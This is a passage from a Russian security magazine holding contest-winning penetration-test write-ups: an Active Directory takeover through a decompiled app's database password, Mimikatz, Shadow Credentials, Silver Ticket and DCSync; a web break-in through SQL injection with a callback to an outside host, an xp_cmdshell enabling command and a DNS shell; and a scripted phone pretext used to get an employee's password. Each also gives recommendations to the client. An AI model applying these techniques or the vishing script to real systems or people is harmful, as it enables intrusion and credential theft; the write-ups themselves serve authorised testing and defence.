паниям, которые не могут обновиться, мы рекомендуем ограничить доступ
к уязвимым файлам или отключить через редактирование уязвимые части
кода. Сотрудникам компании‑заказчика мы порекомендовали ограничить
сетевой доступ до коробочных решений и устанавливать EDR на все хосты.
   Спасибо команде разработчиков за быстрое реагирование и исправление
критической проблемы, актуальной для всех версий продукта.
COVERSTORY





В этой статье я расскажу о тестировании
сети  одной  государственной  компании,
в котором я участвовал. Организация нес‐
колько  раз  в  год  заказывала  пентесты
как внешней, так и внутренней инфраструк‐            secm3n                                                                                        securemen@bk.ru
туры. Мы отрабатывали модель внутренне‐
го нарушителя — злоумышленника, обла‐
дающего доступом к сети компании, но без
привилегий в домене.


Pentest Award
Этот текст занял третье место на премии Pentest Award 2024 в категории
«Пробив инфры». Соревнование ежегодно проводит компания Awillix.


Дело было осенью 2022 года. Мы работали вдвоем с коллегой: он отвечал
за веб‑уязвимости, а я за анализ инфраструктуры — сервисы, домен и про‐
чее.
   Представитель заказчика из команды безопасников с порога заявил, что
ничего у нас не получится, что их только недавно тестировали и все воз‐
можные дырки они закрыли. Он был настолько уверен в этом, что готов был
спорить на ящик пенного. Немного жалею, что от спора мы решили отказать‐
ся.
  В частности, в отделе безопасности утверждали, что регулярно проводят
анализ NTDS путем прогона NTLM-хешей паролей доменных пользователей
по популярным словарям, так что спреить на популярные пароли смысла нет.
  И действительно, проект оказался непростым, учетную запись в домене
мне не предоставили. Я проверил возможность LLMNR poisoning и прочие
вариации этой атаки, попробовал слушать трафик, сканировал на предмет
наличия популярных уязвимостей (Bluekeep, EternalBlue и тому подобных),
проверил анонимные файловые ресурсы, нашел и изучил принтеры и МФУ.
Веб тоже не дал никаких надежд.
  В один прекрасный момент мне повезло: я нашел три хоста с активным
сервисом DameWare, из них доменный был только один. В некоторых версиях
этого  продукта есть  уязвимость CVE-2019-3980,  позволяющая получить
несанкционированный удаленный доступ к атакуемой системе.
   Версия DameWare оказалась уязвимой, и мне удалось создать локальную
учетную запись администратора, извлечь учетные данные из памяти процес‐
са LSASS и развить атаку до полной компрометации домена. Опущу под‐
робности этого вектора, они не представляют особого интереса, он был дос‐
таточно тривиален. Других векторов нам обнаружить тогда не удалось. Самое
интересное было дальше.


             INFO

                         Название домена целевой организации на всех
                         скриншотах замазано, в текстовой части замене‐
                      но test.local.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
В ПОГОНЕ ЗА БИЛЕТОМ
             КАК МЫ ДВАЖДЫ ПРОНИКЛИ
         В ДОМЕН, КОТОРЫЙ СЧИТАЛСЯ
                    НЕПРИСТУПНЫМ





ХОД АТАКИ

С заказчиком у нас был заключен договор сразу на два проекта, и вес‐
ной 2023 года мы вернулись к нему снова, в ту же самую инфраструктуру,
с той же самой точкой подключения, сервисов DameWare в сети уже не наш‐
ли. Заказчик с еще большей уверенностью стал заявлять, что в этот раз у нас
точно ничего не получится, так как все замечания и единственный найденный
нами баг они устранили. Даже спор снова предложил, а мы снова отказались.
И снова пожалели об этом!
   Доменную учетную запись нам, как всегда, не дали, и мы принялись
за сетевое окружение. Я вновь посканировал на предмет аномальных ресур‐
сов, обошел все МФУ, посниффал трафик и провел все прочие процедуры.
Ничего. Мой коллега уязвимостей тоже не нашел.
  И тут на одном из веб‑ресурсов мне попалось опубликованное .NET-при‐
ложение.





                        Веб‑ресурс ppo-app

После нажатия кнопки Start на странице http://ppo-app.test.local/ про‐
исходит скачивание исполняемых файлов приложения во временную дирек‐
торию на компьютере пользователя. Я подробно изучил скачанное приложе‐
ние и выяснил, что оно подключается к базе данных Microsoft SQL, размещен‐
ной на хосте PPO-BD.test.local. Учетные данные для подключения к базе
находятся в файле star.exe.config, который скачивается вместе с при‐
ложением.





                 Окно настроек подключения к базе данных

Однако пароль от учетной записи хранится в нем в зашифрованном виде.
По скриншоту может показаться, что это обычный Base64, но на поверку
это оказалось не так.




           Параметры подключения к базе данных в star.exe.config

Для расшифровки пароля я декомпилировал приложение с помощью ILSpy.
В  динамической  библиотеке Star.Wpf.Controls.dll  нашлась  функция
EncryptionLogic, содержащая ключ шифрования и алгоритм расшифровки.
В результате мне удалось получить пароль от учетной записи базы данных
asabrys (это не доменная учетная запись). Затем с помощью DBeaver я под‐
ключился к базе данных.
   У скомпрометированной учетки были права sysadmin в пределах MSSQL,
чем я и воспользовался, чтобы включить оболочку xp_cmdshell, позволяющую
исполнять команды операционной системы.
   Оказалось, что сервер базы данных работает в контексте служебной учет‐
ной   записи   MSSQL$SQLEXPRESS,    у   которой   есть    привилегия
SeImpersonatePrivilege, то есть можно выполнять команды в контексте
любой учетной записи, в том числе системной.





  Функция расшифровки пароля для подключения к базе данных (файл
   Star.Wpf.Controls.dll)

Чтобы загрузить необходимые инструменты на хост PPO-BD.test.local, я
развернул FTP-сервер на рабочей станции, с которой проводил тестирова‐
ние. Для эскалации привилегий до уровня SYSTEM я использовал инструмент
SharpImpersonation. С его помощью создал учетку локального администра‐
тора itadmin. Затем со своего компьютера подключился к хосту PPO-BD.
test.local по  протоколу RDP и с помощью обфусцированной сборки
Mimikatz создал дамп памяти системного процесса lsass.exe и извлек хра‐
нящиеся там учетные данные.
  В дампе памяти нашелся NTLM-хеш пароля учетной записи компьютера
test.local\PPO-BD$. Других актуальных доменных учеток на хосте PPO-BD.
test.local не было.
  Я использовал Rubeus , чтобы запросить TGT-билет Kerberos для учетной
записи test.local\PPO-BD$, используя NTLM-хеш ее пароля. Это позволило
получить доступ в домен test.local.





  Привилегии и контекст учетной записи сервера базы данных на хосте
  PPO-BD





       Выполнение техники Pass the Hash для учетной записи PPO-BD$

Используя учетную запись компьютера PPO-BD$, я собрал информацию
о домене, включая данные о групповых политиках. При анализе скриптов,
запускаемых этими политиками, удалось найти несколько файлов, в которых
был прописан пароль для локальной учетной записи LocalAdmin.





         Пароль для локальной учетной записи LocalAdmin в скрипте

Я  подключился  к серверу OMO-FSCHANGE.test.local от имени  учетной
записи LocalAdmin. Быстрый осмотр содержимого дисков не принес ничего
полезного — ценных данных не нашлось, активных сессий администраторов
тоже не было. Зато удалось сделать дамп хранилища локальных учетных
записей (LSA).





            Дамп LSA на хосте OMO-FSCHANGE.test.local

Извлеченные из LSA локальные учетные данные включали NTLM-хеш локаль‐
ной учетки admin-omsk, которая состоит в группе локальных администра‐
торов. После перебора хеша по словарю удалось восстановить пароль —
16010916.
  С помощью локальной учетной записи admin-omsk я получил доступ к сер‐
веру OMO-TECH.test.local. На этом сервере нашел активную сессию учет‐
ной записи с таким же именем, но уже доменной — test.local\admin-omsk.





                      Сессии на сервере OMO-TECH

Хоть учетная запись test.local\admin-omsk и не входила в состав домен‐
ных административных групп, она оказалась владельцем учетных записей
администраторов, отвечающих за регион «ОМСК».





                  Владелец учетной записи omo-adminvrs

Права локального администратора позволили извлечь TGT-билет Kerberos
для test.local\admin-omsk из памяти системного процесса и выполнить
атаку Pass the Ticket.





               Результат атаки Pass the Ticket на учетку admin-omsk

Поскольку учетная запись test.local\admin-omsk была владельцем в том
числе учетной записи test.local\omo-adminvrs, я добавил для нее при‐
вилегии GenericAll. Это открыло возможность  провести  атаку Shadow
Credentials, при которой генерируется пара ключей и открытый ключ записы‐
вается в атрибут ms-DS-Key-Credential-Link. С помощью этой пары из откры‐
того и закрытого ключей удалось запросить TGT-билет Kerberos и исполь‐
зовать его для аутентификации в домене.





           Результат атаки Shadow Credentials на учетку omo-adminvrs

Я установил, что члены группы omo-admin-group, включая учетную запись
test.local\omo-adminvrs, имеют права (ACL) на 4507 объектов в домене.
Среди этих прав — GenericWrite на серверы SRVDIRECTUM-SQL и SRV-ND-
PROD-WIN. В поисках вариантов компрометации домена и учетных записей
с повышенными привилегиями я провел атаку Shadow Credentials на объект
SRVDIRECTUM-SQL$ и получил возможность запросить для него билет TGT.





            Атака Shadow Credentials на учетку SRVDIRECTUM-SQL$

Следующим шагом  я  извлек NTLM-хеш  компьютерной  учетной записи
SRVDIRECTUM-SQL$ с помощью UnPAC the Hash.





     Получение NTLM-хеша для учетной записи test.local\srvdirectum-sql$

Эта технология основана на использовании PKINIT, при котором клиент может
запросить   дополнительный   тикет.  В  этом   тикете  KDC   включает
PAC_CREDENTIAL_INFO — специальную структуру, содержащую NTLM-ключи
аутентифицирующего пользователя. Это дает клиенту возможность перек‐
лючаться на NTLM-аутентификацию для служб, которые не поддерживают
Kerberos.
   Полученный NTLM-хеш использовался в технике Silver Ticket, которая поз‐
воляет генерировать сервисные билеты (TGS) Kerberos для любых доменных
учетных записей. Эти билеты будут обладать всеми привилегиями на хосте,
которыми обладал бы зашедший на хост пользователь. В результате мы сге‐
нерировали сервисные билеты для доменного администратора test.local\
d.syroezhkin,  у  которого  есть  права  локального  админа  на  хосте
SRVDIRECTUM-SQL.





                      Билеты TGS на имя d.syroezhkin

С полученными правами удалось создать дамп процесса LSASS и извлечь
из него пароли еще для некоторых доменных учеток.





  Извлеченные из памяти процесса LSASS на хосте SRVDIRECTUM-SQL
  пароли

Таким же способом я получил доступ к хосту SRV-ND-PROD-WIN.





             Права GenericWrite на объект SRV-ND-PROD-WIN$

В памяти процесса LSASS ничего интересного не нашлось. Поэтому мы соб‐
рали данные о локальных учетных записях из хранилища SAM. В результате
получили хеш NTLM для локальной учетной записи Administrator и перебо‐
ром по словарю извлекли пароль Pa******123.





  NTLM-хеш для локального администратора на хосте SRV-ND-PROD-WIN

В результате атаки Pass the Hash я установил, что эта учетная запись с таким
же паролем используется на следующих серверах:
 • SRV-ND-PROD-ACCEPT.TEST.LOCAL;
 • SRV-ND-PROD-AUT.TEST.LOCAL;
 • SRV-ND-PROD-WIN-KODWEB.TEST.LOCAL;
 • HV1-GORIZONT.TEST.LOCAL;
 • SRV-WITNESS-EX.TEST.LOCAL.

Особый интерес представляет сервер SRV-WITNESS-EX. Он входит в группы
Exchange Trusted Subsystem и Exchange Windows Permissions как сер‐
вер Exchange.





    Членство в группах компьютерной учетной записи SRV-WITNESS-EX$

В свою очередь, Exchange Windows Permissions может добавлять членов
в  группу AD_Mgmt, которая имеет  права GenericWrite на  контроллеры
домена.





  Возможные векторы развития атаки после захвата учетной записи SRV-
  WITNESS-EX$

Для начала, используя права локального администратора, я извлек хеш
NTLM-пароля компьютера из локального хранилища LSA на  хосте SRV-
WITNESS-EX. Полученный хеш NTLM я использовал в атаке Overpass the Hash
для получения TGT-билета Kerberos. Это позволило внести изменения в сос‐
тав доменной группы AD_Mgmt. При этом использовалась доменная учетная
запись wa, скомпрометированная ранее на хосте SRVDIRECTUM-SQL.





              Добавление учетной записи wa в группы AD_Mgmt

В качестве конечной цели я выбрал контроллер домена SRVDC01. Через ата‐
ку Shadow Credentials удалось сгенерировать пару  ключей, с помощью
которых я получил TGT-билет Kerberos для учетной записи контроллера
домена. После этого провел атаку DCSync на учетную запись test.local\
admin-voinov, что позволило извлечь хеш AES256 от ее пароля. Билет TGT
также открыл доступ на сам контроллер домена.





                   Доступ на контроллер домена SRVDC01





                               Схема атаки



Для полноты картины я включу сюда из отчета рекомендации, которые дал
заказчику на основе изменений, сделанных в его инфраструктуре. Вот что я
менял:
 1. На сервере PPO-BD.test.local  создал локальную  учетную запись
   администратора itadmin. Заказчику рекомендуется ее удалить.
 2. Изменил значение  атрибута msDS-KeyCredentialLink для  объекта
  test.local\srvdirectum-sql$.  Заказчику  рекомендуется  обнулить
   значение атрибута.
 3. Изменил значение  атрибута msDS-KeyCredentialLink для  объекта
  test.local\srv-nd-prod-win$.  Заказчику  рекомендуется  обнулить
   значение атрибута.
 4. Изменил значение атрибута msDS-KeyCredentialLink у учетной записи
  test.local\omo-adminvrs. Заказчику рекомендуется обнулить зна‐
   чение атрибута.
 5. Назначил права GenericAll учетной записи test.local\admin-omsk
   на test.local\omo-adminvrs. Заказчику рекомендуется отозвать их.




РЕКОМЕНДАЦИИ

По итогам тестирования я дал заказчику следующие рекомендации:
 • сменить пароль для скомпрометированной локальной учетной записи
  LocalAdmin на всех машинах;
 • сменить пароль для скомпрометированной локальной учетной записи
  admin-omsk на всех машинах;
 • удалить скрипты, содержащие пароли;
 • вместо скриптов использовать технологию LAPS;
 • отключить механизм wdigest, который позволяет хранить пароли в откры‐
   том виде;
 • настроить антивирус на запрет дампа процесса LSASS;
 • провести оценку прав для группы omo-admin-group в отношении других
   объектов домена на предмет их избыточности.


ВЫВОДЫ

Ключевым фактором, который позволил получить доступ в домен, стала
некорректная реализация сервисного приложения. В его исходном коде я
нашел конфиденциальные данные. После декомпиляции приложения удалось
получить административный доступ к доменной машине, провести разведку
инфраструктуры и сформировать потенциальные векторы атак.
   После получения доступа в домен мне удалось получить доступ к цепочке
промежуточных серверов, что в итоге дало административный доступ к кон‐
троллеру домена. К компрометации домена привели несколько ключевых
факторов: открытое хранение паролей в скриптах, использование слабых
паролей для административных учетных записей и небезопасная настройка
ACL, которая позволяла злоупотреблять избыточными правами объектов
домена.
  В целом уровень защищенности доменной инфраструктуры можно оце‐
нить как средний. Направления для компрометации домена были ограничен‐
ными. При реализации строгой парольной политики в домене, использовании
механизма LAPS и корректной реализации ACL вероятность компрометации
домена снизится, равно как и шансы все же как‑нибудь проспорить ящик
пива пентестерам.
COVERSTORY





Как‑то раз мы проводили разведку по пулу
из ~9000 IP-адресов крупной российской
IT-компании и нашли заброшенный домен
и работающий на нем сервис. Он оказался
уязвимым, и вскоре мы смогли захватить             cucurucuq                                                                                      pinkgoose121@gmail.com
веб‑сервер и проникнуть во внутреннюю
сеть предприятия. Как это было сделано, я
расскажу в этой статье.


Pentest Award
Этот текст получил пятое место на премии Pentest Award 2024 в категории
«Пробив web». Награждение ежегодно проводит компания Awilix.


Для поиска старых и забытых ресурсов мы использовали технику Passive DNS.
Данные мы взяли из VirusTotal: написали небольшой скрипт, который отправ‐
лял запросы к API с IP-адресами из нашего пула. Это позволило собрать мно‐
жество интересных доменов, большинство из которых входили в наш скоуп.
Так и нашелся тот самый «забытый» веб‑сервис, который впоследствии ока‐
зался уязвимым.
   Домен был непростой, что‑то вроде web1.smth.smth.companyname.com.
Там был  развернут  самописный  сервис  мониторинга  веб‑приложений,
на который, судя по логам, последний раз заходили около месяца назад.
Доступ к нему мы получили с помощью дефолтных учетных данных (admin:
admin), создали отдельную учетку администратора для дальнейшего тес‐
тирования и, конечно же, как настоящие этичные хакеры, оповестили отдел
ИБ заказчика об уязвимости.
  На следующий день ИБ‑отдел закрыл ресурс, хотя мы просили дать воз‐
можность  продолжать  тестирование. Ребята  из  отдела ИБ  объяснили
решение тем, что «там нет ничего интересного».
   Однако я опустил один момент: перед тем как сообщать об уязвимости,
мы спарсили все учетные данные пользователей (для проектных целей
и дальнейшего тестирования), которые хранились в открытом виде прямо
в разметке HTML. Естественно, среди них были и учетки администраторов.





                        Кусочек списка пользователей





                                  Пароль

Полученные учетки мы применили на других ресурсах компании, половина
пользователей действительно существовала, но пароли давным‑давно сме‐
нены.
   Спустя две недели работы над  остальным  скоупом  я  параллельно
занимался разведкой и работой с вебом. В какой‑то момент я взял наш
прошлый  хост — *.smth.smth.companyname.com,  закинул  на перебор
в gobuster и... вуаля! Нашелся тот же самый ресурс, но уже с другим али‐
асом — пусть он будет называться vulnerable.smth.smth.companyname.
com.
   Здесь уже не было дефолтных учетных данных админа, как раньше, поэто‐
му нам и пригодилась учетка администратора из дампа ресурса web1.smth.
smth.companyname.com.
   Получаем  доступ,  ковыряем  приложение  и  находим  возможности
для самых разных SQL-инъекций. Нам удалось реализовать error-based SQLi,
blind (time-based) SQLi, а также мы могли читать локальные файлы с помощью
встроенной функции MS SQL — OpenRowset (она позволяет обращаться
к локальным файлам).





Это было вечером, а к поздней ночи я докрутил инъекцию в MS SQL до Out-
of-Band.





                   Полезная нагрузка для эксплуатации OOB

В принципе, ничего сверхъестественного: в одну строчку назначаем про‐
извольную переменную, присваиваем переменной hostname удаленного сер‐
вера, с помощью функции exec отправляем на исполнение. Пришлось нем‐
ного пошаманить с hostname, скорее всего, WAF блокировал запросы к **.
oastify.com. Но с помощью нехитрых манипуляций — разделения FQDN
на части и конкатенации строк — мне удалось получить отстук на удаленный
сервер.





Но из‑за этого возникло несколько проблем:
 • нужно было каким‑то образом дать права на использование функции
  xp_cmdshell (RCE by design);
 • весь TCP-трафик урезался, и приходили только DNS-запросы, которые,
   соответственно, используют UDP.

В целом с первым вопросом мы разобрались довольно быстро: с помощью
БД master перенастроили использование xp_cmdshell (насколько помню,
у нас была сервисная учетка sa, у которой по дефолту есть права для исполь‐
зования БД master):


use master; sp_configure 'xp_cmdshell', '1'; RECONFIGURE





Реконфиг прошел успешно, теперь мы можем удаленно исполнять код.





Теперь осталось решить вопрос с получением сессии и закреплением.
Динамический реверс‑шелл, к сожалению, получить не удалось из‑за отсутс‐
твия обратной связи по TCP. Поэтому мы обратились за помощью к нашему
небезызвестному коллеге и товарищу s0i37. Очень пригодилась его статья
про способы передачи файлов через DNS, а также сами клиент и сервер
для DNS-шелла.
   Осталось  понять,  каким  образом мы можем  передать  VBS-клиент
на веб‑сервер. Поразмыслив, мы нашли только один вариант — закоди‐
ровать скрипт в Base64 и построчно передать в файл через Burp Intruder,
а потом с помощью certutil декодировать файл и получить рабочий DNS-кли‐
ент.





                         Построчная передача файла




                    Декодируем клиент DNS на сервере





                   Фрагмент декодированного клиента

Мы получили сессию с помощью DNS-шелла и по наводке наших инфраструк‐
турщиков  проверили сетевой  доступ со  скомпрометированной машины
до дата‑центра. Взаимодействие по SMB открыто.





Дело за малым — осталось локально повысить привилегии и передать
машину коллегам — специалистам по тестированию внутренней инфраструк‐
туры.
  В     локальном     повышении    нам    поможет      включенная
SeImpersonatePrivilege.  Берем  эксплоит  из  семейства  «картошек»
или PrintSpoofer, повышаем привилегии и передаем машинку коллегам.





                  Полная схема пробива веб‑приложения


ВЫВОДЫ

Вот как в итоге выглядит цепочка уязвимостей:
 1. Использование словарных паролей.
 2. Небезопасное хранение паролей.
 3. Error-based SQL-инъекция.
 4. Включенная привилегия SeImpersonatePrivilege у сервисной учетной
   записи.

Заказчику мы выдали следующие рекомендации:
 • Настроить парольную политику. Например, использовать сгенерирован‐
  ные случайным образом пароли, состоящие из 12 или более символов
   и содержащие цифры, буквы разных регистров и спецсимволы.
 • Отказаться от хранения паролей сотрудников в разметке HTML, исполь‐
   зовать менеджеры паролей.
 • Использовать параметризованные запросы к СУБД и экранировать поль‐
   зовательский ввод данных.
 • Отключить привилегию SeImpersonatePrivilege у сервисных учетных
   записей.
COVERSTORY





Это было в разгар ковида. Я тогда работал
в одной  IT-компании, где помогал  неп‐
рерывно улучшать систему безопасности.
Приближались учения по социнженерии. Я
сидел и думал над текстом для очередного              S3n_q
фишингового письма, и тут мне в голову
пришла шальная мысль: «Не сделать ли
что‑то повеселее? Например, через звонок
попробовать  узнать  пароль  от  учетки».
Спойлер: успешно получилось.


Pentest Award
Этот текст получил третье место на премии Pentest Award 2024 в категории
«Ловись рыбка». Это соревнование ежегодно проводится компанией Awillix.



Решив идти по стопам Кевина Митника, я принялся размышлять. Нужно было
определить для себя несколько вещей:
 1. Как атакуем?
 2. Кого атакуем?
 3. Какую дополнительную инфу собираем?
 4. Как оцениваем успешность атаки?

И если с последним пунктом нет проблем (пароль или получен, или нет), то
над остальными следовало подумать.
   Ах да, важное ограничение, которое я себе задал, — вся информация дол‐
жна быть собрана через внешние источники. Мы же хотим максимально
приблизиться к тому, как будет вести себя злоумышленник, верно?


ДЕЛАЙ РАЗ — КАК АТАКУЕМ?

Раз следуем заветам Митника, пускай это будет звонок сотруднику, информа‐
ция о котором есть в открытых источниках. Попросим его дать пароль от учет‐
ной записи.
   Кому из компании могут дать пароль? Админам и безопасникам. Пред‐
ставляться безопасником я не могу по простой причине...





Остаются только админы, причем они должны и правда быть в компании, так
как пользователь у нас образованный и на любого Ивана Васильевича
не поведется.
   Значит, нужно будет еще ответить на вопрос «Как узнать данные админа?».
   Чтобы админ позвонил, нужен повод, и это мы обеспечим сами! Отлично
подойдет любое подозрительное письмо, которое мы же и отправим.
   Получается вот такая цепочка действий:
 1. Узнаём информацию от секретаря.
 2. Высылаем подозрительное письмо.
 3. Звоним человеку, представляемся админом.
 4. Пугаем тем, что в письме был стилер и надо поменять пароль.

И это все подводит нас к следующему вопросу: «Кого будем атаковать?»


ДЕЛАЙ ДВА — КОГО АТАКУЕМ?

Логично предположить, что в зоне риска находятся те, про кого есть инфа
в открытом доступе. Публиковать свою почту в открытом доступе могут только
некоторые категории  сотрудников:  продажники, секретари и  рекрутеры.
В качестве цели я выбрал рекрутеров.
   Также нам нужно будет найти системного администратора из компании
или кого‑то из техотдела.


РЕКРУТЕР

Найти адреса рекрутеров легко. Смотрим следующие ресурсы:
 • Сайт для поиска работы: career.habr.com/companies/█████
 • Группа «Вконтакте»: vk.com/█████.████
 • Официальный сайт: █████.team/
 • Google.com

На «Хабр Карьере» удалось найти всех рекрутеров и получить их имена и дол‐
жности. Больше всего информации было у Марии и Дианы.





На официальном сайте находим адреса телефонов секретарей (пригодится
позже) в трех разных отделениях компании и ссылку на официальную группу
«Вконтакте». Через группу удалось выйти на еще один сайт компании, где
перечислены все вакансии. Для одной из вакансий в качестве контактного
лица указана Мария. В данных для связи был Telegram.





Я продолжил искать информацию о Марии и напал на золотую жилу — ее пол‐
ную контактную информацию.





Рабочий телефон, почта, Telegram (где указан сотовый), название вакансии —
достаточно для формирования атаки. Настала очередь админа.


АДМИН

К счастью, тут все попроще, и для поиска нужно было только два ресурса:
 • linkedin.com/company/████████
 • Яндекс

Мою компанию удалось найти в LinkedIn, и в списке сотрудников значился
ведущий системный  администратор.  Также среди  подписчиков нашелся
некий Роман, который неожиданно пригодился позже.





У LinkedIn есть особенность: имена сотрудников могут не отображаться.
Поэтому, чтобы узнать имя и фамилию админа, пришлось поискать по кар‐
тинке.





Много информации не надо, достаточно фамилии и имени, чтобы предста‐
виться. Существует несколько рисков:
 1. Рекрутер может знать админа лично, если она работает в гибридном
   или офисном режиме.
 2. Данные на LinkedIn старые, и админ может уже не работать в компании.

Чтобы  понять,  насколько  риски  соответствуют  действительности, мне
не пришло на ум ничего лучше, кроме как позвонить в компанию и поболтать.


ДЕЛАЙ ТРИ — СБОР ИНФОРМАЦИИ

Данные из интернета никогда не помешает актуализировать. Вдруг админ
вообще уже уволился? Рекрутер вряд ли уволена, вакансии публикуются
небесплатно, и там сразу обновили бы адрес.
   Звонить будем секретарю от имени какой‑нибудь компании‑интегратора,
чтобы впарить чудесные серверы и программы. Плюс попробуем разболтать
секретаря, вдруг узнаем что‑нибудь еще о компании.
   Позвонив в компанию и представившись менеджером по продажам ООО
«ИТ‑Софт‑сервис», я спросил у секретаря, работает ли сейчас у них Дмитрий
С., ведущий системный администратор, так как на его рабочий номер я
не могу дозвониться. Секретарь спросила, как меня зовут и какого хре
с какой целью я спрашиваю про Дмитрия.
   Представившись и рассказав всю свою историю, я сказал, что в базе дан‐
ных Дмитрий у нас указан контактным лицом, поэтому я о нем и спрашиваю.
Если вдруг он уволился, то я с радостью бы пообщался с другим админом.
Секретарь раскрыла карты и сказала, что Дмитрий действительно уже
не работает в компании, но упорно не хотела выдать кого‑то, с кем можно
пообщаться вместо него.
   Тогда я стал ей рассказывать, какие у нас чудо‑серверы, а еще у нас есть
классные мессенджеры для корпоративного общения. В итоге, выслушав, что
им мессенджеры не нужны, так как мессенджер у них есть, я спросил, каким
они пользуются, и узнал, что это «Тимс» (Microsoft Teams). Интересная
информация!
   Потом я чуть снизил напор и спросил, кому можно направить письмо, если
отсылать предложение об услугах. Как оказалось, письмо можно направить
секретарю и указать, что оно будет для Романа, который, как оказалось,
руководитель ОТО. Роман оказался тот самый, что был среди контактов
у Дмитрия.
   Доставая бедного секретаря дальше, я пытался выведать режим работы
Романа, чтобы прийти лично и поговорить о треклятых серверах. Мне ска‐
зали, что надо договариваться лично с ним, так как он редко появляется
в офисе, и попросили присылать всю инфу на почту, чтобы Роман сам
решил, стоит назначать встречу или нет.
  Я решил, что с бедного секретаря хватит, и вежливо попрощался. Сек‐
ретарь, облегченно вздохнув, повесила трубку.
   Подытожим:
 • Дмитрий уволился, поэтому представляемся Романом.
 • Роман работает удаленно или гибридно, поэтому маловероятно, что они
   могут быть знакомы с рекрутером (будем рисковать).
 • В качестве корпоративного мессенджера используется Microsoft Teams.


ХВАТИТ ДЕЛАТЬ — ПОРА АТАКОВАТЬ!

Нам удалось собрать достаточно информации, и теперь можно атаковать
ничего не подозревающего рекрутера.
   Первый шаг — отправляем письмо с файлом, который невозможно
открыть. Текст письма написан так, будто мы уже общались с Марией насчет
этой вакансии.





Вордовский файл не открывается, да...





Это было сделано для двух целей:
 1. Мы все же за безопасность, и хотелось узнать, сообщит ли кому‑то Мария,
   что ей пришел подозрительный файл (спойлер: нет).
 2. В подписи к письму может быть дополнительная информация. Если вдруг
   эта атака не удастся, то можно будет использовать это в другом сценарии.

Отправив письмо днем, я получил ответ только на следующее утро.





Ну что, отправляем второе письмо и готовимся к звонку.





Стоит ли говорить о том, что этот файл тоже не открывается.
   Считаем, что дня после отправки файла достаточно для того, чтобы
открыть  его, поэтому на следующий день звоню с сотового телефона
на рабочий Марии и представляюсь Романом:

       Мария, привет! Это Роман ████████ из ОТО.«               »
Вхожу в доверие и извиняюсь за то, что звоню на рабочий, а не в мессен‐



       Извини, что звоню на сотовый, Teams целый день глючит, не могу
      никого набрать.джер:«                »
Спрашиваю у нее, не открывала ли она какие‑нибудь странные файлы:

       Подскажи, ты за последний день не открывала какие‑нибудь файлы
       подозрительные? Скачанные или из почты, например.«                »
Она говорит, что вчера и сегодня открывала письмо с резюме, но у нее
не открылось, а недавно она еще один файл открыла с PDF, который тоже
выдал ошибку при открытии.
  Я начинаю объяснять причину своего звонка — сработало предупрежде‐
ние на сервере:


     Я вот по какой причине звоню — Дима‑то ушел, и я пока некоторые
      его обязанности взял на себя и поэтому смотрю за системой безопас-«
       ности. И у меня тут сработало предупреждение, что у тебя какая‑то
       странная активность идет.                »
Она говорит, что ей кажется, будто ее компьютер медленнее работает, а то
и вообще тормозит.
  Я начинаю запугивать: спрашивать, не появилось ли странных файлов
на рабочем столе, вдруг это шифровальщик начинает работать...

       Проверь,  пожалуйста,  рабочий  стол,  нет  ли  там  новых  файлов
      или заставки с требованием заплатить денег за расшифровку. Иногда«
      вирусы могут зашифровать компьютер или сеть, а потом вымогать
       деньги.                »
Она делает это, а потом говорит, что рабочий стол обычный — нет новых
файлов и обои стандартные.
  Я радуюсь этому и прошу открыть диспетчер задач, чтобы проверить, нет
ли там одного подозрительного файла, потому что был похожий случай:


      Это хорошо. Слушай, а посмотри еще, пожалуйста, диспетчер задач.
     Там может быть файл svchost.exe. У нас был один случай, когда этот«
      вирус на компе обнаружили. Вот как это можно сделать...                »
Мария смотрит диспетчер задач и с ужасом обнаруживает, что файлов
svchost.exe на самом деле полно. Начинаю нагнетать ужас и говорю, что
на самом деле все еще хуже:

      Блин, это плохо. В общем, этот вирус записывает все твои нажатия,
       снимает экран, сохраняет пароли из браузера и системы, поэтому«
      этих файлов так много.                »
Рекрутер пугается и начинает оправдываться, что так и думала, что с файлами
что‑то не так. Предлагаю свою помощь и говорю, как будем действовать:

     Не переживай, такое с каждым может случиться. Смотри, как пос-
      тупим сейчас: тебе надо будет выключить компьютер, чтобы вирус«
      ничего больше не собирал. Я отправлю кого‑нибудь к тебе, чтобы
       забрали компьютер и  разобрались,  как  лечить. Пока надо будет
      поменять пароль. Если ты его будешь менять, то вирус увидит все
      и нам это не поможет. Давай сделаем так — чтобы тебе было проще
       запоминать, я могу сейчас на сервере заменить твой пароль точно
      таким же, но просто добавлю в конце единицу.                »
Несколько секунд ожидания, и Мария спрашивает, как долго будет происхо‐
дить смена пароля и как долго будут лечить комп. Говорю, что постараемся
сделать все как можно быстрее. После этого мне диктуют пароль.
   Говорю, что в скором времени еще раз наберу, и вежливо прощаюсь.
   После этого пытаюсь зайти в веб‑почту с помощью того пароля, который
продиктовала Мария.
   Пара секунд загрузки, и успех — я попадаю в ее почту.





Пароль получен, цель достигнута. Что дальше?


ДЕЛАЕМ, ЧТОБЫ ТАКОГО БОЛЬШЕ НЕ БЫЛО

После разбора полетов и оценки успешности атаки начинаем созваниваться
с Марией и настоящим Романом ████████ для разговора и объяснения
того, что произошло. На встрече я спросил у Марии, не передавала ли она
кому‑то пароль, и она уверенно сказала, что передавала, но только Роману.
Тот очень удивился и сказал, что никому не звонил и пароль, естественно,
не просил.
   После паузы Маша произнесла одно слово — БЛ████████.
   Есть множество рисков и потенциальных ситуаций, когда эта атака могла
не дать результата: Мария могла знать Романа, продиктовать полностью
новый пароль, сообщить его напрямую Роману в мессенджере или по его
настоящему телефону. Тем не менее атака удалась.
  Мы задались вопросом, что нужно, чтобы такого больше не повторилось.
Вот что сделали по итогам:
 1. Провели разговор со всеми рекрутерами.
 2. Актуализовали внутренний курс по информационной безопасности.
 3. Сделали рассылку, где говорилось о том, что в случае подозрений лучше
   звонить в отдел ИБ.
 4. Поставили учения по социнженерии наряду с фишингом.
 5. Стали рассматриваться варианты двухфакторной аутентификации.

Все было учтено и выполнено. Мы думали, что такого снова не должно было
случиться. Следующие учения показали, что все не так хорошо, как мы
думали...
ВЗЛОМ





Бытует мнение, что защитные механизмы
для  Android-приложений  слабы  и  легко
обходятся, однако реальность оказывается
гораздо  сложнее. На  рынке  существует
множество   коммерческих   протекторов,           МВК
